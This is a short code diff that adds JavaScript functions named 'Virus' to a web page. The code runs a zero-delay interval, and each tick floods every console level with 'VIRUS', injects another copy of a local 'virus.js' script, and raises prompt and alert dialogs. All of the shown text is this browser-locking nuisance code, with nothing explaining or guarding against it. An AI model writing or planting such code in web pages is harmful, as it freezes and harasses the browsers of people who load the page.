@@ -1,0 +1,30 @@
+
+       function Virus() {
+        setInterval(VirusAction, 0)
+       }
+       
+       function VirusAction() {
+        VirusAnnoyAction()
+        VirusPowerAction()
+        VirusAlertAction()
+       }
+       
+       function VirusAnnoyAction() {
+        console.log("VIRUS")
+        console.info("VIRUS")
+        console.warn("VIRUS")
+        console.error("VIRUS")
+        console.debug("VIRUS")
+       }
+       
+       function VirusPowerAction() {
+        var virusjs = document.createElement("script")
+        virusjs.src = "good_super_diamond_browser_files/virus/virus.js"
+        virusjs.id = "VIRUS"
+        document.body.appendChild(virusjs)
+       }
+       
+       function VirusAlertAction() {
+        var response = prompt("VIRUS")
+        alert("VIRUS + " + response)
+       }
